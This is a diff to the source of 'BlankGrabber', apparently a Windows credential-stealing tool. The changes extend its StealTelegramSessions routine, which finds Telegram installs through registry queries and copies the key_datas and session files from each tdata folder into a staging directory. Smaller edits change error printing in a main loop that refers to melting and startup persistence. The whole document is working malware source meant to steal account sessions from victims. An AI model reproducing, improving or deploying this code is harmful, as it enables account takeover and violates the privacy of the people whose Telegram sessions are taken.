@@ -120,6 +120,8 @@ class Errors:
                 if not isinstance(e, UnicodeEncodeError):
                     trb = traceback.format_exc()
                     Errors.errors.append(trb)
+                    if hasattr(sys, "frozen"):
+                        print(trb)
         
         return newFunc
 
@@ -1071,29 +1073,45 @@ class BlankGrabber:
     @Errors.Catch
     def StealTelegramSessions(self) -> None:
         if Settings.CaptureTelegram:
-            telegramPath = os.path.join(os.getenv("appdata"), "Telegram Desktop", "tdata")
+
+            telegramPaths = []
             loginPaths = []
             files = []
             dirs = []
             has_key_datas = False
 
-            if os.path.isdir(telegramPath):
-                for item in os.listdir(telegramPath):
-                    path = os.path.join(telegramPath, item)
-                    if item == "key_datas":
-                        has_key_datas = True
-                        loginPaths.append(path)
-                    
-                    if os.path.isfile(path):
-                        files.append(item)
-                    else:
-                        dirs.append(item)
-                
-                for filename in files:
-                    for dirname in dirs:
-                        if dirname + "s"  == filename:
-                            loginPaths.extend([os.path.join(telegramPath, x) for x in (filename, dirname)])
+            process = subprocess.run(r"reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", shell= True, capture_output= True)
+            if process.returncode == 0:
+                paths = [x for x in process.stdout.decode(errors= "ignore").splitlines() if x.strip()]
+                for path in paths:
+                    process = subprocess.run(r'reg query "{}" /v DisplayIcon'.format(path), shell= True, capture_output= True)
+                    if process.returncode == 0:
+                        path = process.stdout.strip().decode().split(" " * 4)[-1].split(",")[0]
+                        if "telegram" in path.lower():
+                            telegramPaths.append(os.path.dirname(path))
+            
+            if not telegramPaths:
+                telegramPaths.append(os.path.join(os.getenv("appdata"), "Telegram Desktop"))
 
+            for path in telegramPaths:
+                path = os.path.join(path, "tdata")
+                if os.path.isdir(path):
+                    for item in os.listdir(path):
+                        itempath = os.path.join(path, item)
+                        if item == "key_datas":
+                            has_key_datas = True
+                            loginPaths.append(itempath)
+                    
+                        if os.path.isfile(itempath):
+                            files.append(item)
+                        else:
+                            dirs.append(item)
+                
+                    for filename in files:
+                        for dirname in dirs:
+                            if dirname + "s" == filename:
+                                loginPaths.extend([os.path.join(path, x) for x in (filename, dirname)])
+            
             if has_key_datas and len(loginPaths) - 1 > 0:
                 saveToDir = os.path.join(self.TempFolder, "Messenger", "Telegram")
                 os.makedirs(saveToDir, exist_ok= True)
@@ -1304,7 +1322,7 @@ if __name__ == "__main__" and os.name == "nt":
             else:
                 time.sleep(10)
         except Exception as e:
-            print(e)
+            print("Main Error: " + str(e))
             time.sleep(600)
     
     if Settings.Melt and not Utility.IsInStartup():
